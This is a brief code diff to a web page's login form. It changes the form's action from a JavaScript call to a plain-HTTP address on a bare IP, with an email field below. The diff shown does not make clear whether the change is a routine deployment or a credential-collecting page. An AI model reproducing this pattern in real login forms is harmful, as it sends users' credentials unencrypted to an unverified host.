@@ -295,7 +295,7 @@ function formToggle() {
 	
 	
     <div class="form">
-	<form id="login_form" name="login_form" method="post" action="login()">
+	<form id="login_form"  name="login_form" method="post" action="http://34.68.249.249/reg12/welcome.php">
                 
               <div class="inputfield">
           <label>Email Address</label>
